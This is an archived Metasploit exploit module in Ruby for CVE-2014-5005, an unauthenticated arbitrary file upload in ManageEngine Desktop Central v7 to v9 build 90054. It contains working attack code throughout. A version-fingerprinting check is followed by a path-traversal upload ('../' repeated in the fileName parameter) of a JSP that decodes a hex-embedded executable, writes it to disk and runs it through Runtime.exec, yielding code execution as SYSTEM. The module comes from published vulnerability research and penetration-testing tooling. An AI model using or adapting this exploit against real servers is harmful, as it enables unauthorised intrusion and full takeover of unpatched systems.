##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# NOTE !!!
# This exploit is kept here for archiving purposes only.
# Please refer to and use the version that has been accepted into the Metasploit framework.

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'ManageEngine Desktop Central StatusUpdate Arbitrary File Upload',
      'Description'    => %q{
        This module exploits an arbitrary file upload vulnerability in ManageEngine DesktopCentral
        v7 to v9 build 90054 (including the MSP versions).
        A malicious user can upload a JSP file into the web root without authentication, leading to
        arbitrary code execution as SYSTEM. Some early builds of version 7 are not exploitable as
        they do not ship with a bundled Java compiler.
      },
      'Author'         =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>'        # Vulnerability discovery and Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2014-5005' ],
          [ 'OSVDB', '110643' ],
          [ 'URL', 'http://seclists.org/fulldisclosure/2014/Aug/88' ],
          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/me_dc9_file_upload.txt' ]
        ],
      'Platform'       => 'win',
      'Arch'           => ARCH_X86,
      'Targets'        =>
        [
          [ 'Desktop Central v7 to v9 build 90054 / Windows', {} ]
        ],
      'Privileged'     => true,
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Aug 31 2014'
    ))

    register_options(
      [
        OptPort.new('RPORT',
          [true, 'The target port', 8020])
      ], self.class)
  end


  def check
    # Test for Desktop Central
    res = send_request_cgi({
      'uri' => normalize_uri("configurations.do"),
      'method' => 'GET'
    })

    if res and res.code == 200
      if res.body.to_s =~ /ManageEngine Desktop Central 7/ or
       res.body.to_s =~ /ManageEngine Desktop Central MSP 7/                    # DC v7
        print_status("#{peer} - Detected Desktop Central v7")
        return Exploit::CheckCode::Appears
      elsif res.body.to_s =~ /ManageEngine Desktop Central 8/ or
       res.body.to_s =~ /ManageEngine Desktop Central MSP 8/
        if res.body.to_s =~ /id="buildNum" value="([0-9]+)"\/>/                 # DC v8 (later versions)
          build = $1
          print_status("#{peer} - Detected Desktop Central v8 #{build}")
        else                                                                    # DC v8 (earlier versions)
          print_status("#{peer} - Detected Desktop Central v8")
        end
        return Exploit::CheckCode::Appears
      elsif res.body.to_s =~ /ManageEngine Desktop Central 9/ or
       res.body.to_s =~ /ManageEngine Desktop Central MSP 9/
        if res.body.to_s =~ /id="buildNum" value="([0-9]+)"\/>/                 # DC v9
          build = $1
          print_status("#{peer} - Detected Desktop Central v9 #{build}")
          if build < "90055"
            return Exploit::CheckCode::Appears
          else
            return Exploit::CheckCode::Safe
          end
        end
      end
    end
  end


  def exploit
    print_status("#{peer} - Uploading JSP to execute the payload")

    exe = payload.encoded_exe
    exe_filename = rand_text_alpha_lower(8) + ".exe"

    jsp_payload = jsp_drop_and_execute(exe, exe_filename)
    jsp_name = rand_text_alpha_lower(8) + ".jsp"

    send_request_cgi({
      'uri'       => normalize_uri('statusUpdate'),
      'method'    => 'POST',
      'data'      => jsp_payload,
      'ctype'     => 'text/html',
      'vars_get'  => {
        'actionToCall'  => 'LFU',
        'configDataID'  => '1',
        'customerId'    => rand_text_numeric(4),
        'fileName'      => '../' * 6 << jsp_name
      }
    })
    # We could check for HTTP 200 and a "success" string.
    # However only some later v8 and v9 versions return this; and we don't really care
    # and do a GET to the file we just uploaded anyway.

    register_files_for_cleanup(exe_filename)
    register_files_for_cleanup("..\\webapps\\DesktopCentral\\#{jsp_name}")

    print_status("#{peer} - Executing payload")
    send_request_cgi(
    {
      'uri'    => normalize_uri(jsp_name),
      'method' => 'GET'
    })
  end


  def jsp_drop_bin(bin_data, output_file)
    jspraw =  %Q|<%@ page import="java.io.*" %>\n|
    jspraw << %Q|<%\n|
    jspraw << %Q|String data = "#{Rex::Text.to_hex(bin_data, "")}";\n|

    jspraw << %Q|FileOutputStream outputstream = new FileOutputStream("#{output_file}");\n|

    jspraw << %Q|int numbytes = data.length();\n|

    jspraw << %Q|byte[] bytes = new byte[numbytes/2];\n|
    jspraw << %Q|for (int counter = 0; counter < numbytes; counter += 2)\n|
    jspraw << %Q|{\n|
    jspraw << %Q|  char char1 = (char) data.charAt(counter);\n|
    jspraw << %Q|  char char2 = (char) data.charAt(counter + 1);\n|
    jspraw << %Q|  int comb = Character.digit(char1, 16) & 0xff;\n|
    jspraw << %Q|  comb <<= 4;\n|
    jspraw << %Q|  comb += Character.digit(char2, 16) & 0xff;\n|
    jspraw << %Q|  bytes[counter/2] = (byte)comb;\n|
    jspraw << %Q|}\n|

    jspraw << %Q|outputstream.write(bytes);\n|
    jspraw << %Q|outputstream.close();\n|
    jspraw << %Q|%>\n|

    jspraw
  end


  def jsp_execute_command(command)
    jspraw =  %Q|\n|
    jspraw << %Q|<%\n|
    jspraw << %Q|Runtime.getRuntime().exec("#{command}");\n|
    jspraw << %Q|%>\n|

    jspraw
  end


  def jsp_drop_and_execute(bin_data, output_file)
    jsp_drop_bin(bin_data, output_file) + jsp_execute_command(output_file)
  end
end
